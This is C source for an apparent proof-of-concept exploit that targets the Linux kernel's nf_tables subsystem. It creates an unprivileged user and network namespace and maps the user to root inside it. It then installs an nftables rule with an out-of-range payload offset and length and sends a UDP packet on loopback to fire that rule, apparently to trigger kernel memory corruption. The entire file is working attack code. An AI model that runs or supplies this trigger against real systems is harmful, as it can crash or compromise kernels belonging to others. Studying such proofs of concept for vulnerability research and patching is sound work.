// gcc poc.c -o poc -lnftnl -lmnl -w

#define _GNU_SOURCE 1
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sched.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

static void rule_add_set_payload(struct nftnl_rule *r, uint32_t base,
            uint32_t sreg, uint32_t offset, uint32_t len, uint32_t csum_type)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("payload");
	if (e == NULL) {
        perror("nftnl_expr_alloc");
        exit(EXIT_FAILURE);
    }

	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_SREG, sreg);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_CSUM_TYPE, csum_type);

	nftnl_rule_add_expr(r, e);
}

void setup_nftable() {
    char buf[MNL_SOCKET_BUFFER_SIZE];
    struct nlmsghdr *nlh;
    struct mnl_socket *nl;
    struct mnl_nlmsg_batch *batch;
    int seq;

    nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL) {
        perror("mnl_socket_open");
        exit(EXIT_FAILURE);
    }
    
    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
        perror("mnl_socket_bind");
        exit(EXIT_FAILURE);
    }
    
    seq = time(NULL);

    struct nftnl_table *table = nftnl_table_alloc();
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, "table");
    nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, NFPROTO_IPV4);

    struct nftnl_chain *chain = nftnl_chain_alloc();
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, "table");
    nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, "chain");
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, NF_INET_PRE_ROUTING);
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_PRIO, 10); 
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, NFPROTO_IPV4);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TYPE, "filter");

    struct nftnl_rule *rule = nftnl_rule_alloc();
    nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, "table");
    nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, "chain");
    nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, NFPROTO_IPV4);

    rule_add_set_payload(rule, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG32_00, 0xff,
                         0x40, NFT_PAYLOAD_CSUM_INET);

    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                     NFT_MSG_NEWTABLE, NFPROTO_IPV4,
                                     NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK,
                                      seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    nftnl_table_free(table);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                     NFT_MSG_NEWCHAIN, NFPROTO_IPV4,
                                     NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, 
                                     seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain);
    nftnl_chain_free(chain);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                     NFT_MSG_NEWRULE, NFPROTO_IPV4,
                                     NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rule);
    nftnl_rule_free(rule);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                        mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("mnl_socket_sendto");
        exit(EXIT_FAILURE);
    }

    mnl_nlmsg_batch_stop(batch);
}

void write_file(const char *filename, const char *buf, size_t buflen, 
                unsigned int flags)
{
    int fd;

    fd = open(filename, O_WRONLY | O_CREAT | flags, 0755);
    if (fd < 0) {
        perror("open");
        exit(EXIT_FAILURE);
    }

    if (write(fd, buf, buflen) != buflen) {
        perror("write");
        exit(EXIT_FAILURE);
    }

    close(fd);
}

void bring_interface_up(const char *ifname)
{
    int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ifr.ifr_flags |= IFF_UP;
    ioctl(sockfd, SIOCSIFFLAGS, &ifr);

    close(sockfd);
}

void configure_uid_map(uid_t old_uid, gid_t old_gid) {
    char uid_map[128];
    char gid_map[128];
    
    sprintf(uid_map, "0 %d 1\n", old_uid); 
    sprintf(gid_map, "0 %d 1\n", old_gid);

    write_file("/proc/self/uid_map", uid_map, strlen(uid_map), 0);
    write_file("/proc/self/setgroups", "deny", strlen("deny"), 0);
	write_file("/proc/self/gid_map", gid_map, strlen(gid_map), 0);
}

void do_unshare() {
    if(unshare(CLONE_NEWUSER) < 0) {
        perror("unshare");
        exit(EXIT_FAILURE);
    }

    if (unshare(CLONE_NEWNET) < 0) {
        perror("unshare");
        exit(EXIT_FAILURE);
    }
}

void setup_env() {
    uid_t uid = getuid();
    gid_t gid = getgid();

    do_unshare();
    configure_uid_map(uid, gid);
    bring_interface_up("lo");
    setup_nftable();
}

int main(int argc, char *argv[]) {
    setup_env();    

    int server_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (server_sockfd == -1) {
        perror("socket$udp_server");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in server_addr = {
	    .sin_family = AF_INET,
        .sin_port = htons(45173),
	    .sin_addr.s_addr = inet_addr("127.0.0.1")
	};

    if (bind(server_sockfd, (const struct sockaddr *)&server_addr, 
            sizeof(server_addr)) == -1) {
        perror("bind$udp_server");
        exit(EXIT_FAILURE);
    }
    
    int client_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (client_sockfd == -1) {
        perror("socket$udp_client");
        exit(EXIT_FAILURE);
    }

    const char *msg = "AAAA";

    if (sendto(client_sockfd, msg, strlen(msg), 0, 
        (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("sendto$udp_client");
        exit(EXIT_FAILURE);
    }

    return 0;
}
